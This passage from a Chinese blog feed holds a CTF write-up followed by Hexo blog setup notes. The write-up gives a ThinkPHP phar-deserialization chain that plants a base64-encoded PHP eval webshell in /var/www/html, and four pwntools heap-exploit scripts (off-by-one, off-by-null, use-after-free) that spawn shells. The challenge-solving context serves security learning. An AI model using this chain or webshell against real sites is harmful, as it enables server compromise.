&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options=null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options=[</span><br><span class="line">                &#x27;expire&#x27; =&gt; 3600,</span><br><span class="line">                &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">                &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                &#x27;path&#x27;  =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;,</span><br><span class="line">                &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">            ];</span><br><span class="line">            $this-&gt;tag = &#x27;xxx&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output = new think\console\Output($Memcached);</span><br><span class="line">    $model = new think\db\Query($Output);</span><br><span class="line">    $HasOne = new think\model\relation\HasOne($model);</span><br><span class="line">    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($window);        </span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);        </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="【pwn1】"><a href="#【pwn1】" class="headerlink" title="【pwn1】"></a>【pwn1】</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199866613426.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn2】"><a href="#【pwn2】" class="headerlink" title="【pwn2】"></a>【pwn2】</h3><p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199871632928.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line"> io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#0</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#2</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#3</span><br><span class="line"> add(0x18,&#x27;f1ag\n&#x27;)#4</span><br><span class="line"> dele(2)</span><br><span class="line"> add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2</span><br><span class="line"></span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;a\n&#x27;)#5~11</span><br><span class="line"> for i in range(7):</span><br><span class="line">  dele(11-i)</span><br><span class="line"> </span><br><span class="line"> dele(0)</span><br><span class="line"> gdb.attach(io)</span><br><span class="line"> dele(3)</span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#10</span><br><span class="line"> show(1)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#11=1</span><br><span class="line"> dele(1)</span><br><span class="line"> edit(11,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12</span><br><span class="line"> dele(12)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn3】"><a href="#【pwn3】" class="headerlink" title="【pwn3】"></a>【pwn3】</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199876154830.webp" alt="图片"></p>
<p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io) ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendafter(&#x27;another level :&#x27;,description) </span><br><span class="line"></span><br><span class="line">def beat(): </span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">   </span><br><span class="line">def exp():</span><br><span class="line"> create(&#x27;a&#x27;*35+&#x27;\n&#x27;)</span><br><span class="line"> power(&#x27;a&#x27;)</span><br><span class="line"> power(&#x27;\xff\xff\xff\xff&#x27;)</span><br><span class="line"> beat()</span><br><span class="line"> </span><br><span class="line"> io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line"> puts=int(io.recv(14),16)</span><br><span class="line"> libc_base=puts-libc.symbols[&#x27;puts&#x27;] </span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"> dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line"> gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line"> </span><br><span class="line"> io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn4】"><a href="#【pwn4】" class="headerlink" title="【pwn4】"></a>【pwn4】</h3><p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p>
<p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199883877032.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,name,length,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line"> io.sendlineafter(&#x27;Key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line"> add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)</span><br><span class="line"> add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)</span><br><span class="line"> dele(0)</span><br><span class="line"> show(0)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"> </span><br><span class="line"> add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)</span><br><span class="line"> add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)</span><br><span class="line"> dele(3)</span><br><span class="line"> dele(2)</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)</span><br><span class="line"> edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)</span><br><span class="line"> </span><br><span class="line"> add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)</span><br><span class="line"> </span><br><span class="line"> #add(6,&#x27;f1ag&#x27;,p64(system),5)</span><br><span class="line"> </span><br><span class="line"> dele(1)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>博客制作遇到的问题</title>
    <url>/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>制作博客的过程中遇到的一部分问题及其解决办法</p>
<span id="more"></span>

<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><p><code>hexo server</code> #启动本地服务器，用于预览主题。Hexo 会监视文件变动并自动更新，除修改站点配置文件外,无须重启服务器,直接刷新网页即可生效。</p>
<p><code>hexo server -s</code> #以静态模式启动</p>
<p><code>hexo server -p 5000</code> #更改访问端口 (默认端口为4000，’ctrl + c’关闭server)</p>
<p><code>hexo server -i IP地址</code> #自定义 IP</p>
<p><code>hexo clean</code> #清除缓存 ,网页正常情况下可以忽略此条命令,执行该指令后,会删掉站点根目录下的public文件夹</p>
<p><code>hexo g</code> #生成静态网页 (执行 $ <code>hexo g</code>后会在站点根目录下生成public文件夹, hexo会将”/blog/source/“ 下面的.md后缀的文件编译为.html后缀的文件,存放在”/blog/public/ “ 路径下)</p>
<p><code>hexo d</code> #自动生成网站静态文件，并将本地数据部署到设定的仓库(如github)</p>
<p><code>hexo init</code> 文件夹名称 #初始化XX文件夹名称</p>
<p><code>npm update hexo -g</code>#升级</p>
<p><code>npm install hexo -g</code> #安装</p>
<p><code>node-v</code> #查看node.js版本号</p>
<p><code>npm -v</code> #查看npm版本号</p>
<p><code>git --version</code> #查看git版本号</p>
<p><code>hexo -v</code> #查看hexo版本号</p>
<h1 id="简写指令"><a href="#简写指令" class="headerlink" title="简写指令"></a>简写指令</h1><p>hexo n “我的第一篇文章”<code>等价于</code>hexo new “我的第一篇文章”<code>还等价于</code>hexo new post “我的第一篇文章”<br>hexo p<code>等价于</code>hexo publish<br>hexo g<code>等价于</code>hexo generate<br>hexo s<code>等价于 </code>hexo server<br>hexo d<code>等价于</code>hexo deploy<br>hexo g -d<code>等价于</code>hexo generate –deploy<br>注: <code>hexo clean</code> 没有 简写, <code>git --version</code> 没有简写</p>
<h1 id="hexo-next设置网站运行时间"><a href="#hexo-next设置网站运行时间" class="headerlink" title="hexo+next设置网站运行时间"></a>hexo+next设置网站运行时间</h1><p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/MB5B%25Y4VY%60%25V_WO7@1Y%5BW6B.jpg" alt="img"></p>
<p>找到<code>hexo\themes\next\layout\_partials\footer.swig</code>添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date(); </span><br><span class="line">    function createtime() &#123; </span><br><span class="line">        var grt= new Date(&quot;08/10/2018 17:38:00&quot;);//在此处修改你的建站时间，格式：月/日/年 时:分:秒</span><br><span class="line">        now.setTime(now.getTime()+250); </span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); </span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); </span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); </span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125; </span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); </span><br><span class="line">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125; </span><br><span class="line">        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;; </span><br><span class="line">        document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后部署上传即可！</p>
<h1 id="添加樱花飘落效果"><a href="#添加樱花飘落效果" class="headerlink" title="添加樱花飘落效果"></a>添加樱花飘落效果</h1><p>在<code>themes/matery/source/js</code>目录下新建<code>sakura.js</code>文件，将内容复制粘贴到sakura.js即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var stop, staticx;</span><br><span class="line">var img = new Image();</span><br><span class="line">img.src =</span><br><span class="line">    &quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUgAAAEwCAYAAADVZeifAAAACXBIWXMAAACYAAAAmAGiyIKYAAAHG2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBSaWdodHM9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9yaWdodHMvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcFJpZ2h0czpNYXJrZWQ9IkZhbHNlIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6NDFDMjQxQjYyNjIwNjgxMTgwODNEMjE2MDAzOTU1NDQiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDozNDVjOWViOC04NDc4LTFkNDctOGRjMi0yZDkyOGNhYTYxZWQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE4LTA1LTA5VDE0OjQ5OjM3KzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOC0wNS0wOVQxNDo1MToyNSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjEyMjVlZWE3LTEyY2QtMTY0NC04ZDAzLWFjOTE2ZTAxZDQ1YyIgc3RSZWY6ZG9jdW1lbnRJRD0idXVpZDoxRDIwNUFGNjZCRDlFNTExOUM5REMwMzg2RjlEQjFGNyIvPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDphYmMzNjIzMy1hOWNkLWNiNDQtODViYi0zZTgyMjEwYmIxMjYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDlUMTQ6NTE6MjUrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE4IChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6YjAzN2ZiMGItNTU5Mi0xYjRkLWJjZGQtOWU4NGExMDJiMGM2IiBzdEV2dDp3aGVuPSIyMDE4LTA1LTA5VDE0OjUxOjI1KzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOCAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2Vx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